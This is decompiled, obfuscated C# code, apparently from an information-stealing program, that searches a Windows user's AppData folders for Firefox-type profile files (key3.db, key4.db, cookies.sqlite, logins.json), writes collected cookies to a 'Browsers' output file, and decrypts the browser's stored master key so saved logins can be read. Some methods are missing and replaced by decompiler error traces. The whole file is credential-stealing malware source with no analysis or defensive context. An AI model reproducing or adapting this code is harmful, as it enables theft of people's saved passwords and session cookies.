using System;
using System.Collections.Generic;
using System.Data;
using System.Globalization;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using ns14;
using ns20;
using ns23;
using ns25;
using ns26;
using ns27;
using ns28;
using ns9;

namespace ns19
{
	// Token: 0x02000025 RID: 37
	internal class Class13
	{
		// Token: 0x0600014F RID: 335 RVA: 0x0000B54C File Offset: 0x0000974C
		public static List<string> smethod_0(string string_3, int int_0 = 4, int int_1 = 1, params string[] string_4)
		{
			List<string> list = new List<string>();
			if (string_4 != null && string_4.Length != 0 && int_1 <= int_0)
			{
				List<string> result;
				try
				{
					foreach (string path in Directory.GetDirectories(string_3))
					{
						try
						{
							DirectoryInfo directoryInfo = new DirectoryInfo(path);
							FileInfo[] files = directoryInfo.GetFiles();
							bool flag = false;
							int num = 0;
							while (num < files.Length && !flag)
							{
								int num2 = 0;
								while (num2 < string_4.Length && !flag)
								{
									string a = string_4[num2];
									FileInfo fileInfo = files[num];
									if (a == fileInfo.Name)
									{
										flag = true;
										list.Add(fileInfo.FullName);
									}
									num2++;
								}
								num++;
							}
							foreach (string item in Class13.smethod_0(directoryInfo.FullName, int_0, int_1 + 1, string_4))
							{
								if (!list.Contains(item))
								{
									list.Add(item);
								}
							}
						}
						catch
						{
						}
					}
					result = list;
				}
				catch
				{
					result = list;
				}
				return result;
			}
			return list;
		}

		// Token: 0x06000150 RID: 336 RVA: 0x0000B68C File Offset: 0x0000988C
		public static void smethod_1(string string_3, string string_4, string string_5)
		{
			/*
An exception occurred when decompiling this method (06000150)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void ns19.Class13::smethod_1(System.String,System.String,System.String)
 ---> System.Exception: Inconsistent stack size at IL_2A
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 443
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 269
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 112
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 88
   --- Конец трассировки внутреннего стека исключений ---
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 92
   в ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:строка 1533
*/;
		}

		// Token: 0x06000151 RID: 337 RVA: 0x0000B6FC File Offset: 0x000098FC
		public static void smethod_2()
		{
			if (!Directory.Exists(GClass9.string_6 + "\\Browsers"))
			{
				Directory.CreateDirectory(GClass9.string_6 + "\\Browsers");
			}
			List<string> list = new List<string>();
			list.AddRange(Class13.smethod_0(Class13.string_0, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			list.AddRange(Class13.smethod_0(Class13.string_2, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			foreach (string text in list)
			{
				string fullName = new FileInfo(text).Directory.FullName;
				string string_ = text.Contains(Class13.string_2) ? Class13.smethod_13(fullName) : Class13.smethod_14(fullName);
				string string_2 = Class13.smethod_4(fullName);
				Class13.smethod_7(fullName, string_, string_2);
				string text2 = "";
				foreach (string str in Class13.list_1)
				{
					text2 += str;
				}
				if (text2 != "")
				{
					File.WriteAllText(GClass9.string_6 + "\\Browsers\\Cookies_Gecko.txt", text2, Encoding.Default);
				}
			}
		}

		// Token: 0x06000152 RID: 338 RVA: 0x0000B8D8 File Offset: 0x00009AD8
		public static void smethod_3()
		{
			if (!Directory.Exists(GClass9.string_6 + "\\Browsers"))
			{
				Directory.CreateDirectory(GClass9.string_6 + "\\Browsers");
			}
			List<string> list = new List<string>();
			list.AddRange(Class13.smethod_0(Class13.string_0, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			list.AddRange(Class13.smethod_0(Class13.string_2, 4, 1, new string[]
			{
				"key3.db",
				"key4.db",
				"cookies.sqlite",
				"logins.json"
			}));
			foreach (string text in list)
			{
				string fullName = new FileInfo(text).Directory.FullName;
				string string_ = text.Contains(Class13.string_2) ? Class13.smethod_13(fullName) : Class13.smethod_14(fullName);
				string string_2 = Class13.smethod_4(fullName);
				Class13.smethod_1(fullName, string_, string_2);
			}
		}

		// Token: 0x06000153 RID: 339 RVA: 0x0000BA38 File Offset: 0x00009C38
		private static string smethod_4(string string_3)
		{
			try
			{
				string[] array = string_3.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[array.Length - 1];
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x06000154 RID: 340 RVA: 0x0000BA90 File Offset: 0x00009C90
		public static string smethod_6()
		{
			return Path.Combine(Class13.string_1, "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode().ToString() + Thread.CurrentThread.ManagedThreadId.ToString());
		}

		// Token: 0x06000155 RID: 341 RVA: 0x0000BAF8 File Offset: 0x00009CF8
		public static void smethod_7(string string_3, string string_4, string string_5)
		{
			/*
An exception occurred when decompiling this method (06000155)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void ns19.Class13::smethod_7(System.String,System.String,System.String)
 ---> System.Exception: Inconsistent stack size at IL_196
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 443
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 269
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 112
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 88
   --- Конец трассировки внутреннего стека исключений ---
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 92
   в ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:строка 1533
*/;
		}

		// Token: 0x06000156 RID: 342 RVA: 0x0000BCDC File Offset: 0x00009EDC
		public static void smethod_8(string string_3, byte[] byte_1, string string_4, string string_5)
		{
			/*
An exception occurred when decompiling this method (06000156)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void ns19.Class13::smethod_8(System.String,System.Byte[],System.String,System.String)
 ---> System.Exception: Inconsistent stack size at IL_28A
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 443
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 269
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 112
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 88
   --- Конец трассировки внутреннего стека исключений ---
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 92
   в ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:строка 1533
*/;
		}

		// Token: 0x06000157 RID: 343 RVA: 0x0000BFC4 File Offset: 0x0000A1C4
		private static byte[] smethod_9(string string_3)
		{
			byte[] array = new byte[24];
			byte[] result;
			try
			{
				if (File.Exists(string_3))
				{
					GClass8 gclass = new GClass8(string_3);
					gclass.method_3("metaData");
					string s = gclass.method_2(0, "item1");
					string s2 = gclass.method_2(0, "item2)");
					GClass12 gclass2 = GClass10.smethod_0(Encoding.Default.GetBytes(s2));
					byte[] byte_ = gclass2.List_0[0].List_0[0].List_0[1].List_0[0].Byte_0;
					byte[] byte_2 = gclass2.List_0[0].List_0[1].Byte_0;
					GClass16 gclass3 = new GClass16(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), byte_);
					gclass3.method_0();
					GClass14.smethod_0(gclass3.Byte_3, gclass3.Byte_4, byte_2, PaddingMode.None);
					gclass.method_3("nssPrivate");
					int int32_ = gclass.Int32_0;
					string s3 = string.Empty;
					for (int i = 0; i < int32_; i++)
					{
						if (gclass.method_2(i, "a102") == Encoding.Default.GetString(Class13.byte_0))
						{
							s3 = gclass.method_2(i, "a11");
							IL_176:
							GClass12 gclass4 = GClass10.smethod_0(Encoding.Default.GetBytes(s3));
							byte_ = gclass4.List_0[0].List_0[0].List_0[1].List_0[0].Byte_0;
							byte_2 = gclass4.List_0[0].List_0[1].Byte_0;
							gclass3 = new GClass16(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), byte_);
							gclass3.method_0();
							array = Encoding.Default.GetBytes(GClass14.smethod_0(gclass3.Byte_3, gclass3.Byte_4, byte_2, PaddingMode.PKCS7));
							return array;
						}
					}
					goto IL_176;
				}
				result = array;
			}
			catch (Exception)
			{
				result = array;
			}
			return result;
		}

		// Token: 0x06000158 RID: 344 RVA: 0x0000C23C File Offset: 0x0000A43C
		private static byte[] smethod_10(string string_3)
		{
			byte[] array = new byte[24];
			byte[] result;
			try
			{
				if (!File.Exists(string_3))
				{
					result = array;
				}
				else
				{
					new DataTable();
					GClass17 gclass17_ = new GClass17(string_3);
					GClass15 gclass = new GClass15(Class13.smethod_12(gclass17_, new Func<string, bool>(Class13.Class14.<>9.method_0)));
					string string_4 = Class13.smethod_12(gclass17_, new Func<string, bool>(Class13.Class14.<>9.method_1));
					GClass16 gclass2 = new GClass16(Class13.smethod_11(string_4), Encoding.Default.GetBytes(string.Empty), Class13.smethod_11(gclass.String_0));
					gclass2.method_0();
					GClass14.smethod_0(gclass2.Byte_3, gclass2.Byte_4, Class13.smethod_11(gclass.String_2), PaddingMode.None);
					GClass12 gclass3 = GClass10.smethod_0(Class13.smethod_11(Class13.smethod_12(gclass17_, new Func<string, bool>(Class13.Class14.<>9.method_2))));
					GClass16 gclass4 = new GClass16(Class13.smethod_11(string_4), Encoding.Default.GetBytes(string.Empty), gclass3.List_0[0].List_0[0].List_0[1].List_0[0].Byte_0);
					gclass4.method_0();
					GClass12 gclass5 = GClass10.smethod_0(GClass10.smethod_0(Encoding.Default.GetBytes(GClass14.smethod_0(gclass4.Byte_3, gclass4.Byte_4, gclass3.List_0[0].List_0[1].Byte_0, PaddingMode.None))).List_0[0].List_0[2].Byte_0);
					if (gclass5.List_0[0].List_0[3].Byte_0.Length <= 24)
					{
						array = gclass5.List_0[0].List_0[3].Byte_0;
						result = array;
					}
					else
					{
						Array.Copy(gclass5.List_0[0].List_0[3].Byte_0, gclass5.List_0[0].List_0[3].Byte_0.Length - 24, array, 0, 24);
						result = array;
					}
				}
			}
			catch (Exception)
			{
				result = array;
			}
			return result;
		}

		// Token: 0x06000159 RID: 345 RVA: 0x0000C4A8 File Offset: 0x0000A6A8
		public static byte[] smethod_11(string string_3)
		{
			if (string_3.Length % 2 != 0)
			{
				throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[]
				{
					string_3
				}));
			}
			byte[] array = new byte[string_3.Length / 2];
			for (int i = 0; i < array.Length; i++)
			{
				string s = string_3.Substring(i * 2, 2);
				array[i] = byte.Parse(s, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
			}
			return array;
		}

		// Token: 0x0600015A RID: 346 RVA: 0x0000C53C File Offset: 0x0000A73C
		private static string smethod_12(GClass17 gclass17_0, Func<string, bool> func_0)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> keyValuePair in gclass17_0.List_0)
				{
					if (func_0(keyValuePair.Key))
					{
						text = keyValuePair.Value;
					}
				}
			}
			catch (Exception)
			{
			}
			return text.Replace("-", string.Empty);
		}

		// Token: 0x0600015B RID: 347 RVA: 0x0000C5C8 File Offset: 0x0000A7C8
		private static string smethod_13(string string_3)
		{
			string text = string.Empty;
			try
			{
				string[] array = string_3.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x0600015C RID: 348 RVA: 0x0000C66C File Offset: 0x0000A86C
		private static string smethod_14(string string_3)
		{
			string text = string.Empty;
			try
			{
				string[] array = string_3.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch (Exception)
			{
			}
			return text.Replace(" ", string.Empty);
		}

		// Token: 0x04000082 RID: 130
		public static List<string> list_0 = new List<string>();

		// Token: 0x04000083 RID: 131
		public static List<string> list_1 = new List<string>();

		// Token: 0x04000084 RID: 132
		public static List<string> list_2 = new List<string>();

		// Token: 0x04000085 RID: 133
		public static List<string> list_3 = new List<string>();

		// Token: 0x04000086 RID: 134
		public static readonly string string_0 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local");

		// Token: 0x04000087 RID: 135
		public static readonly string string_1 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp");

		// Token: 0x04000088 RID: 136
		public static readonly string string_2 = Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Roaming");

		// Token: 0x04000089 RID: 137
		public static readonly byte[] byte_0 = new byte[]
		{
			248,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			0,
			1
		};

		// Token: 0x02000026 RID: 38
		[CompilerGenerated]
		[Serializable]
		private sealed class Class14
		{
			// Token: 0x06000161 RID: 353 RVA: 0x0000C7B8 File Offset: 0x0000A9B8
			internal bool method_0(string string_0)
			{
				return string_0.Equals(<Module>.smethod_9<string>((uint)(-1222179648 - sizeof(byte) + 178), (uint)(-1222180099 - sizeof(byte) + 629), (uint)(-1222182309 - sizeof(int) + 388)));
			}

			// Token: 0x06000162 RID: 354 RVA: 0x0000C808 File Offset: 0x0000AA08
			internal bool method_1(string string_0)
			{
				return string_0.Equals(<Module>.smethod_8<string>((uint)(1324844893 - sizeof(byte) + 178), (uint)(1324844442 - sizeof(byte) + 629), (uint)(1324842232 - sizeof(int) + 388)));
			}

			// Token: 0x06000163 RID: 355 RVA: 0x0000C858 File Offset: 0x0000AA58
			internal bool method_2(string string_0)
			{
				if (!string_0.Equals(<Module>.smethod_12<string>((uint)(1324360772 + sizeof(bool) - 776), (uint)(1324359460 + sizeof(decimal) + 521), (uint)(1324356398 * sizeof(sbyte)))) && !string_0.Equals(<Module>.smethod_11<string>((uint)(2056660071 - sizeof(decimal) + 921), (uint)(2056660720 - sizeof(decimal) + 272), (uint)(2056658234 - sizeof(int) - 853))))
				{
					return (string_0.Equals(<Module>.smethod_12<string>((uint)(1425783235 + sizeof(sbyte) - 200), (uint)(1425782410 + sizeof(int) + 622), (uint)(1425779132 + sizeof(short) + 303))) ? 1 : 0) == 0 * sizeof(long);
				}
				return 636 - sizeof(decimal) - 620 != 0;
			}

			// Token: 0x0400008A RID: 138
			public static readonly Class13.Class14 <>9 = new Class13.Class14();

			// Token: 0x0400008B RID: 139
			public static Func<string, bool> <>9__18_0;

			// Token: 0x0400008C RID: 140
			public static Func<string, bool> <>9__18_1;

			// Token: 0x0400008D RID: 141
			public static Func<string, bool> <>9__18_2;
		}
	}
}
